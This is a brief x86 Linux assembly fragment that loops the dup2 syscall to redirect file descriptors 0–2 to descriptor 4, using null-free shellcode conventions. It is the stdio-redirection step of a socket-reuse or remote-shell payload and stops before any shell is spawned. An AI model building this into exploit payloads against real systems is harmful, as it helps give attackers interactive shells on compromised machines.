.intel_syntax noprefix
.globl _start
_start:
    xor ebx,ebx
    mov bl,0x4
    xor ecx,ecx
    mov cl,0x2
dup2:
    xor eax,eax
    mov al,0x3f
    int 0x80
    dec ecx
    jns dup2
